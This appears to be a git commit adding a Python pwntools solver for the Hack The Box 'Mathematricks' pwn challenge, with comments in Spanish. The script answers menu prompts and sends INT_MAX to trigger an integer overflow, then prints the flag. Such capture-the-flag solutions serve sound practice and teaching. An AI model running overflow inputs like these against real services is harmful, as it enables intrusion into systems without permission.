57470fa5f3dcae688334d1fb0a20ed8f82f311bb
cybersecurity-and-programming <178198474+cybersecurity-and-programming@users.noreply.github.com>
2026-09-07 03:02:55 +0200

    Add files via upload

---
+++ pwn/Very Easy/HTB Challenge - Mathematricks/solver_mathematricks.py
@@ -0,0 +1,46 @@
+#!/usr/bin/python3
+import signal
+import sys
+from pwn import *
+import warnings
+from argparse import ArgumentParser
+def exit_handler(sig, frame):
+    print("\n[!] Saliendo de la aplicacion...")
+    sys.exit(1)
+
+#evento para controlar la salida de la aplicacion con Ctrl+C
+signal.signal(signal.SIGINT, exit_handler)
+
+warnings.filterwarnings('ignore')
+context.arch = 'amd64'
+context.log_level = 'critical'
+
+name_program = './mathematricks'
+
+def exploit(ip, puerto):
+    if ip in ('127.0.0.1', 'localhost'):
+        print("[+] Iniciando proceso local")
+        r    = process(name_program)
+    else:
+        print("[+] Iniciando proceso remoto")
+        r    = remote(ip, puerto)
+
+    sla = lambda x,y : r.sendlineafter(x,y)
+    sla('🥸 ', '1')
+
+    # Questions
+    sla('> ', '2')
+    sla('> ', '1')
+    sla('> ', '0')
+    sla('n1: ', '2147483647') # INT_MAX
+    sla('n2: ', '10')
+
+    print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
+
+if __name__ == '__main__':
+    parser = ArgumentParser()
+    parser.add_argument("-i", "--ip", help="Direccion IP del host a analizar", required=True)
+    parser.add_argument("-p", "--port", help="Puerto del host a analizar")
+
+    args = parser.parse_args()
+    exploit(args.ip,args.port)
